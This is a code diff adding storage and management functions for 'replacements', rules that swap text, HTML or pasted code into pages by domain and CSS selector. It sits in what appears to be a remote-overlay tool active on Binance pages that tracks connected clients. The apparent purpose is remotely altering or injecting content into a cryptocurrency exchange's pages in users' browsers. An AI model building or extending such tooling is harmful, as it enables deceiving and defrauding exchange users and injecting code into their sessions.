@@ -54,6 +54,7 @@ console.log('[RemoteOverlay] Active on Binance domain:', window.location.hostnam
   ],
   clients: [],
   messages: [],
+  replacements: [],
   stats: {
     totalRequests: 0,
     lastSync: new Date().toISOString(),
@@ -878,4 +879,128 @@ export async function getStats() {
     totalClients: (local.clients || []).length,
     isMongoLive: false,
   };
+}
+
+// ----------------------------------------------------------------------
+// DOM TEXT REPLACEMENTS OPERATIONS (In-Page Text Modifier)
+// ----------------------------------------------------------------------
+
+export async function getReplacements(domain = null) {
+  const { db, isLive } = await getDatabase();
+  let list = [];
+
+  if (isLive) {
+    const mongoReplacements = await db.collection('replacements').find({ enabled: true }).toArray();
+    list = mongoReplacements.map(({ _id, ...rest }) => ({
+      ...rest,
+      id: rest.id || String(_id),
+    }));
+  } else {
+    const local = getLocalDb();
+    list = (local.replacements || []).filter((r) => r.enabled !== false);
+  }
+
+  if (!domain) return list;
+
+  return list.filter((r) => {
+    if (!r.domain || r.domain === '*' || r.domain === '<all_urls>') return true;
+    return matchDomain(r.domain, domain);
+  });
+}
+
+export async function getAllReplacements() {
+  const { db, isLive } = await getDatabase();
+  let list = [];
+
+  if (isLive) {
+    const mongoReplacements = await db.collection('replacements').find({}).sort({ updatedAt: -1 }).toArray();
+    list = mongoReplacements.map(({ _id, ...rest }) => ({
+      ...rest,
+      id: rest.id || String(_id),
+    }));
+  } else {
+    const local = getLocalDb();
+    list = local.replacements || [];
+  }
+
+  return list;
+}
+
+export async function saveReplacement(data) {
+  const { db, isLive } = await getDatabase();
+  const id = data.id || 'rep_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7);
+  const now = new Date().toISOString();
+
+  const replacementItem = {
+    id,
+    domain: (data.domain || '*').trim(),
+    selector: (data.selector || '').trim(),
+    originalText: (data.originalText || '').trim(),
+    replacementText: data.replacementText !== undefined ? String(data.replacementText) : '',
+    pastedCode: (data.pastedCode || '').trim(),
+    replaceType: data.replaceType || 'text', // 'text' | 'html'
+    enabled: data.enabled !== undefined ? Boolean(data.enabled) : true,
+    createdAt: data.createdAt || now,
+    updatedAt: now,
+  };
+
+  if (isLive) {
+    await db.collection('replacements').updateOne(
+      { id },
+      { $set: replacementItem },
+      { upsert: true }
+    );
+    return replacementItem;
+  }
+
+  const local = getLocalDb();
+  local.replacements = local.replacements || [];
+  const idx = local.replacements.findIndex((r) => r.id === id);
+  if (idx >= 0) {
+    local.replacements[idx] = replacementItem;
+  } else {
+    local.replacements.unshift(replacementItem);
+  }
+  saveLocalDb(local);
+  return replacementItem;
+}
+
+export async function deleteReplacement(id) {
+  if (!id) return false;
+  const { db, isLive } = await getDatabase();
+
+  if (isLive) {
+    await db.collection('replacements').deleteOne({ id });
+    return true;
+  }
+
+  const local = getLocalDb();
+  local.replacements = (local.replacements || []).filter((r) => r.id !== id);
+  saveLocalDb(local);
+  return true;
+}
+
+export async function toggleReplacement(id, enabled) {
+  if (!id) return null;
+  const { db, isLive } = await getDatabase();
+  const now = new Date().toISOString();
+
+  if (isLive) {
+    await db.collection('replacements').updateOne(
+      { id },
+      { $set: { enabled: Boolean(enabled), updatedAt: now } }
+    );
+    return await db.collection('replacements').findOne({ id });
+  }
+
+  const local = getLocalDb();
+  local.replacements = local.replacements || [];
+  const idx = local.replacements.findIndex((r) => r.id === id);
+  if (idx >= 0) {
+    local.replacements[idx].enabled = Boolean(enabled);
+    local.replacements[idx].updatedAt = now;
+    saveLocalDb(local);
+    return local.replacements[idx];
+  }
+  return null;
 }
